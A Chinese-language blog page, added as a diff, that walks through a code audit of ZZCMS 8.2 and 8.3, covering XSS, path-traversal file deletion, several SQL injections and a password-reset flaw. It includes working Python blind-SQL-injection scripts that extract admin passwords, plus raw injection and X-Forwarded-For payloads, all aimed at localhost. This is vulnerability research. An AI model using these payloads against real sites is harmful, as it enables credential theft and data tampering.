@@ -1,0 +1,941 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="代码审计,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="ZZCMS基础核心文件：inc/fuction.php  全局函数文件inc/config.php  常量配置文件inc/conn.php    数据库连接配置文件,其中还包含了funcion.php功能函数及stopsqlin.php 过滤sql语句 对所有get post 等收到的数据进行消毒 在zzzms中的php文件中几乎都会包含conn.php check.php,check.php 是">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="zzcms各版本审计之路">
+<meta property="og:url" content="https://style-404.github.io/2019/03/17/zzcms各版本审计之路/index.html">
+<meta property="og:site_name" content="可乐&#39;blog">
+<meta property="og:description" content="ZZCMS基础核心文件：inc/fuction.php  全局函数文件inc/config.php  常量配置文件inc/conn.php    数据库连接配置文件,其中还包含了funcion.php功能函数及stopsqlin.php 过滤sql语句 对所有get post 等收到的数据进行消毒 在zzzms中的php文件中几乎都会包含conn.php check.php,check.php 是">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0sbj8dkcbj30wx0jbwho.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0td1upkijj30jy04x74l.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0td4pajtsj30ig05mt97.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0td9hsy62j30fk02cq2u.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0tdilpjm2j30yu0fqq5h.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0psobmnzrj30oo0ajaaz.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0tdos0hwij30sz03b74o.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0pu8m3y8lj30ug0by75l.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0pud0oj3fj30z00bkwhn.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rv0p9f8xj30jn060t91.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rvkyevvrj30q609wgm2.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rvo68hkij30xl0e8whl.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r1ezsusdj30xc04e0t9.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r1r2v6ysj30oo0bbwfb.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r27u4oohj30zh0glacb.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r2b9fd30j310z0ahwg9.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r3grydu9j30zk0lcwhk.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rxagjqpzj30vd0b4mym.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ry5akoqmj30kd03i74f.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ry5vw7zrj30hj02kdfu.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ry1bz3waj30zk0lcdj1.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ojmhuoe9j30v10ii40o.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0okeij9dcj30o805v3z2.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0otawhn3tj30ky0440sx.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0on1hdm00j30w509jgn1.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0op1fek6sj30kw08g0tf.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0opyuds18j30z50d30uq.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ote7zwxhj311x0ivgn9.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rz5sguycj30s504adgm.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rz8zgypvj30sq085t9t.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0sbovb4psj30u9042gly.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0sbtwhnfcj30mc06hjs5.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0sc9fo7o4j30rv0f9q49.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0scjo9xtlj30j8090gm9.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0scr3b20cj30z20d076i.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0z4d3irxcj30tt0940tr.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g10aywgajbj30hv04qq30.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0z6cbmz8gj30lx059dg2.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g10ax6sndqj30z60a0q43.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0z4uz95rej30ws06i3zc.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1662802twj30ps0b9myk.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1664mp70aj30zp03n74n.jpg">
+<meta property="og:updated_time" content="2019-03-17T15:23:52.386Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="zzcms各版本审计之路">
+<meta name="twitter:description" content="ZZCMS基础核心文件：inc/fuction.php  全局函数文件inc/config.php  常量配置文件inc/conn.php    数据库连接配置文件,其中还包含了funcion.php功能函数及stopsqlin.php 过滤sql语句 对所有get post 等收到的数据进行消毒 在zzzms中的php文件中几乎都会包含conn.php check.php,check.php 是">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0sbj8dkcbj30wx0jbwho.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://style-404.github.io/2019/03/17/zzcms各版本审计之路/">
+
+
+
+
+
+  <title>zzcms各版本审计之路 | 可乐'blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">可乐'blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>
+            
+            日程表
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://style-404.github.io/2019/03/17/zzcms各版本审计之路/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="筱阳">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="可乐'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">zzcms各版本审计之路</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-17T23:22:47+08:00">
+                2019-03-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="ZZCMS基础"><a href="#ZZCMS基础" class="headerlink" title="ZZCMS基础"></a>ZZCMS基础</h1><p>核心文件：<br>inc/fuction.php  全局函数文件<br>inc/config.php  常量配置文件<br>inc/conn.php    数据库连接配置文件,其中还包含了funcion.php功能函数及stopsqlin.php 过滤sql语句 对所有get post 等收到的数据进行消毒</p>
+<p>在zzzms中的php文件中几乎都会包含conn.php check.php,check.php 是判断用户是否登入</p>
+<p>adv.php 设置和修改广告词 包括对图片的修改与上传<br>adv2.php抢占广告位<br>zhadd.php  发展会 交给zhsave.php 处理<br>msg_manage.php 管理群发<br>msg.php 进行群发</p>
+<p>ZZCMS的数据库<br>zzcms_ad  存储 抢占广告位的 信息<br>zzcms_zh 存储展会所属的用户的有关信息<br>zzcms_zhclass 存储展会的类别<br>zzcms_pp 存储 发布的品牌 及上传的图片的地址<br>zzcms_main  储存招商信息</p>
+<h1 id="zzcms-8-2"><a href="#zzcms-8-2" class="headerlink" title="zzcms 8.2"></a>zzcms 8.2</h1><hr>
+<p>前言:<br>ZZCMS 8.2可以说是学习代码审计的一个练手cms了 整个cms读通不需要花太多时间 而且本身也包含了很多漏洞 XXS sql注入 任意文件删除等等<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0sbj8dkcbj30wx0jbwho.jpg" alt=""></p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p><strong>漏洞文件:</strong> /install/step_6.php</p>
+<p><strong>漏洞原因:</strong>  没有进行安全过滤</p>
+<p><strong>漏洞分析:</strong><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0td1upkijj30jy04x74l.jpg" alt=""></p>
+<p>在step6这里,会输出$admin $adminpwdtrue 这两个变量的值<br>然后在install/index.php,把数组中的键名直接注册为了变量<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0td4pajtsj30ig05mt97.jpg" alt=""><br>通俗来讲就是如果POST一个admin = 1  就会把admin 注册为变量使用 且值为1<br>接着往下看 在switch语句中 如果到了步骤case 6 就会包含step_6.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0td9hsy62j30fk02cq2u.jpg" alt=""><br>在安装cms时只是依次判断,接着进行相应的包含,在数据的传递中没有进行安全处理<br><strong>漏洞复现:</strong><br>在/index.php中post相应的step的值会进行相应的文件包含<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0tdilpjm2j30yu0fqq5h.jpg" alt=""><br>成功触发XSS</p>
+<p><strong>漏洞文件:</strong> /zx/show.php</p>
+<p><strong>漏洞原因:</strong>  直接拼接,没有用引号包裹</p>
+<p><strong>漏洞分析:</strong><br>zx目录是资讯页面 show.php 的功能是显示发布的资讯文章及对此文章进行评论<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0psobmnzrj30oo0ajaaz.jpg" alt=""><br>在23行起 先判断要取得文章id 然后从数据库取出 显示出来 其中 coutent 被取出来然后加入stripfxg()处理<br>跟进stripfxg() 在/inc/stopsqlin.php 其功能是还原被实体化的数据<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0tdos0hwij30sz03b74o.jpg" alt=""></p>
+<p>继续用Seay审计系统在show.php对countent 进行追踪 发现调用showcontent和Payjf等方法,输出到页面上，但是这些方法没有对一些危险字符进行安全处理<br>这就造成了数据在进行实体化存入数据库然后还原成原来的数据没有进行过滤,会导致注入语句被成功执行<br><strong>漏洞复现</strong><br>在注册一个用户test 在发布资讯或者公司新闻 点击源码再发送XSS注入代码<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0pu8m3y8lj30ug0by75l.jpg" alt=""><br>发布成功之后点击浏览 发现成功触发JS<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0pud0oj3fj30z00bkwhn.jpg" alt=""></p>
+<h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p><strong>漏洞文件:</strong> /user/adv.php,/user/licence_save.php,/user/ppsave.php 等具有文件上传功能的文件</p>
+<p><strong>漏洞原因:</strong> <strong>.</strong> 和 <strong>/</strong> 字符没有过滤而导致夸目录删除文件</p>
+<p><strong>漏洞分析:</strong><br>在个人中心里面,有很多上传图片的功能及对图片进行修改，这些文件上传功能的代码几乎都没有进行过滤验证,就导致了夸目录删除文件<br>比如在 /user/ppsave.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rv0p9f8xj30jn060t91.jpg" alt=""></p>
+<p>这里仅仅只是判断了oldimg 与img 是否相等 不相等就删除oldimg 而且 oldimg 与 img 是通过POST接收,只是trim一下没有进行任何对 . / 等危险字符进行过滤,而且进行伪造 过分相信了用户的输入</p>
+<p><strong>漏洞复现:</strong><br>我们在个人中心 随便找一个 可以上传文件的页面 就拿adv.php 这个页面 我们点击修改 然后抓包 修改 oldimg 与img 为了便于测试 我们先建一个test文件夹 然后在里面新建一些文件</p>
+<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rvkyevvrj30q609wgm2.jpg" alt=""></p>
+<p>修改oldimg = test/test.txt<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rvo68hkij30xl0e8whl.jpg" alt=""></p>
+<p>可以看到我们的test.txt 被删除了<br>在ZZcms8.2 版本中上传功能代码几号都是那样写的 这样就导致了很多有上传功能的文件 都是有漏洞的</p>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><strong>漏洞文件:</strong> /user/adv2.php CVE：CVE-2018-8967</p>
+<p><strong>漏洞原因:</strong>  直接拼接,没有用引号包裹</p>
+<p><strong>漏洞分析:</strong></p>
+<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r1ezsusdj30xc04e0t9.jpg" alt=""><br>在72行可看到 直接拼接POST进来的值且 没有用引号包裹 这就造成了虽然开头包含了过滤sql注入文件对所有get,post 进行消毒，但是又是直接拼接因为没有用引号包裹,所以不用单引号也可以直接进行sql注入。<br>要想进入这个语句,需要满足 $a+$c &gt;0<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r1r2v6ysj30oo0bbwfb.jpg" alt=""><br>即在zzcms_zh或者zzcms_main表查询到有记录</p>
+<p><strong>漏洞复现:</strong></p>
+<p>先确保  </p>
+<ol>
+<li>zzcms_zh或者zzcms_main表有数据 不然无法进入执行sql语句</li>
+<li>zzcms_ad 表有数据 如果为空时 后面的盲注将不会有任何延迟</li>
+</ol>
+<p>我们先注册企业用户在个人中心点击抢占广告位(没有可登入后台进行添加) 然后点击抢占这个位置时进行抓包<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r27u4oohj30zh0glacb.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r2b9fd30j310z0ahwg9.jpg" alt=""><br>可以看到 会POST一个id交给adv2.php,接下来构造盲注<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r3grydu9j30zk0lcwhk.jpg" alt=""><br>右下角看到延迟10秒,说明执行成功 POC如下</p>
+<pre><code>   import requests
+import time
+
+url = &quot;http://127.0.0.1/user/adv2.php?action=modify&quot;
+flag = &quot;&quot;
+for j in xrange(1,20):
+    for i in xrange(31,128):
+
+        payload = &quot;id=1 or if(select ascii(substr(pass,{num},1)) from zzcms_admin) = {index},sleep(5),1)%23&quot;.format(num=j,index=i)
+
+        strart_time = time.time()
+        r = requests.post(url,data=payload,headers={&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;})
+        end_time = time.time()
+
+        cost = end_time - strart_time
+        if cost &gt; 5:
+            flag +=chr(i)
+            print flag
+            break
+print &apos;flag is  %s &apos; % flag
+</code></pre><p><strong>漏洞文件:</strong> /dl/dl_sendmail.php<br><strong>漏洞原因:</strong> 直接拼接进sql语句中 没有进行过滤 使用危险函数stripfxg()<br><strong>CVE:</strong> CVE-2018-9309<br><strong>漏洞分析:</strong><br>此文件是给代理发邮件时会将数据发送给dl_sendmail.php处理<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rxagjqpzj30vd0b4mym.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ry5akoqmj30kd03i74f.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ry5vw7zrj30hj02kdfu.jpg" alt=""><br>从POST接受过来的sql 进行stripfxg()处理然后赋给了session 最后拼接 执行sql语句，且没有用号包裹,在之前就分析分析过这个方法<br>这是将被转义的字符还原 简单来说就是 输入 ‘ 如果经过转义 到数据库会变为 ‘\ 取出来查看是否进过转义 还原为 ‘ 呈现给用户<br>使用了这个危险函数stripfxg() 他可以将全局过滤还原成正常的数据，如果这个数据带入了sql查询中，会直接造成注入的。<br><strong>漏洞复现:</strong><br>进行复现时要保证 zzcms_msg 有数据 且 有个elite 属性值为1<br>点击发邮件 然后抓包 修改sql 内容<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ry1bz3waj30zk0lcdj1.jpg" alt=""></p>
+<p>这里我用的盲注,可看到成功延迟10秒</p>
+<p><strong>漏洞文件:</strong> www/user/del.php<br><strong>漏洞原因:</strong> 直接拼接进sql语句中<br><strong>CVE:</strong> CVE-2018-9309<br><strong>漏洞分析:</strong><br>将del.php 放入Seay审计系统可清楚的知道此文件有哪些变量 方便进行审计<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ojmhuoe9j30v10ii40o.jpg" alt=""><br>首先对传入的pagename,tablename 进行了简单去空处理 id 被chekid()函数进行了处理,找到checkid()<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0okeij9dcj30o805v3z2.jpg" alt=""><br>对id进行了过滤，接着在switch语句中 sql语句只有对id进行拼接操作 也不存在sql注入  接着往下看 当$tablename不满足if和elseif 的条件的时候,发现我们传入的tablename 直接被拼接到了sql语句当中并且tablename变量也没有用单引号包裹 没有进行任何过滤<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0otawhn3tj30ky0440sx.jpg" alt=""><br><strong>漏洞复现:</strong><br>先注册一个账户 test(不用注册登入也是可以进行注入的) 然后点击发公司新闻先发布一条信息，在数据库查看 发现 已经存入数据库当中<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0on1hdm00j30w509jgn1.jpg" alt=""><br>接下来我们再删除这条信息的时候抓包<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0op1fek6sj30kw08g0tf.jpg" alt=""><br>看到  删除的时候会将tablename 发送给del.php 处理 于是构造sql注入<br>post:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>&amp;tablename=zzcms_zx where id=<span class="number">1</span> union select <span class="number">1</span>,<span class="number">2</span> and if((ascii(substr(user(),<span class="number">1</span>,<span class="number">1</span>)) = <span class="number">114</span>),sleep(<span class="number">10</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure></p>
+<p>用union语句 以免因为前面的select 语句为空而注入失败<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0opyuds18j30z50d30uq.jpg" alt=""><br>右下角显示延迟10 秒 说明成功注入<br>这里需要注意 不能用 大于号和小于号 前面已经说过这个cms会在 inc/stopsqlin.php 中 用addslashes()、htmlspecialchars() 对get 和 post 过来的值进行处理<br>POC如下 py2环境下成功运行<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/user/del.php"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">xrange</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">xrange</span>(<span class="number">31</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">"id=1&amp;tablename=zzcms_zx where id=1 union select 1,2 and if(ascii(substr(database(),&#123;num&#125;,1)) = &#123;index&#125;,sleep(5),1)%23"</span>.format(<span class="built_in">num</span>=j,index=i)</span><br><span class="line"></span><br><span class="line">        strart_time = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">        r = requests.post(url,data=payload,headers=&#123;<span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>&#125;)</span><br><span class="line">        end_time = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line"></span><br><span class="line">        cost = end_time - strart_time</span><br><span class="line">        <span class="keyword">if</span> cost &gt; <span class="number">5</span>:</span><br><span class="line">            flag +=chr(i)</span><br><span class="line">            <span class="built_in">print</span> flag</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"><span class="built_in">print</span> 'flag <span class="built_in">is</span>  <span class="built_in">%s</span> ' <span class="symbol">%</span> flag</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ote7zwxhj311x0ivgn9.jpg" alt=""></p>
+<p><strong>漏洞文件:</strong> /user/check.php<br><strong>漏洞原因:</strong> getip()中没有进行过滤</p>
+<p><strong>漏洞分析:</strong><br>check.php 是个检查用户登入状态文件 很多文件都包含此文件<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rz5sguycj30s504adgm.jpg" alt=""><br>这行sql语句调用了getip()来获取ip值,接着看看这个函数<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rz8zgypvj30sq085t9t.jpg" alt=""><br>发现只是单纯的从HTTP直接换取ip值 没有进行过滤 接下来进行XFF注入</p>
+<p><strong>漏洞复现:</strong><br>只要包含了check.php 都可以进行XFF注入<br>X-Forwarded-For’:1’or sleep(7)</p>
+<h2 id="任意用户密码修改"><a href="#任意用户密码修改" class="headerlink" title="任意用户密码修改"></a>任意用户密码修改</h2><p><strong>漏洞文件:</strong> /one/getpassword.php<br><strong>漏洞分析:</strong><br>getpassword.php 是用来找回密码功能的文件代码<br>通过判断$action的值来进行相应的步骤<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0sbovb4psj30u9042gly.jpg" alt=""><br>在73行起 如果$action=step3 <code>$_SESSION[&#39;username&#39;]</code> 不为空 然后就进行update操作<br><code>$_SESSION[&#39;username&#39;]</code>又是从step1 中 post传递过来的 username，就导致了username可控<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0sbtwhnfcj30mc06hjs5.jpg" alt=""></p>
+<p><strong>漏洞复现:</strong><br>首先第一步 先输入要找回密码的用户名 点击下一步时抓包<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0sc9fo7o4j30rv0f9q49.jpg" alt=""><br>这样就有了session值<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0scjo9xtlj30j8090gm9.jpg" alt=""></p>
+<p>然后将action改为step3 修改POST数据 password的值就是修改的密码<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0scr3b20cj30z20d076i.jpg" alt=""><br>可以看到 test用户密码修改成功 然后进行登入 登入成功</p>
+<h1 id="ZZCMS-8-3"><a href="#ZZCMS-8-3" class="headerlink" title="ZZCMS 8.3"></a>ZZCMS 8.3</h1><p>首先看官网对之前版本的处理<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0z4d3irxcj30tt0940tr.jpg" alt=""></p>
+<p>虽然更新到8.3 但是还是存在很多 漏洞  有些在8.2存在的漏洞在8.3也没有解决<br>所以很多漏洞在8.2版本也就有了<br>可以看到 <strong>/dl/dl_sendmail.php</strong> 这个sql漏洞在8.3还存在</p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>其实这个也在8.2存在,整个CMS管理后台设计操作的表单没有设置token验证，导致了可以进行夸站请求伪造</p>
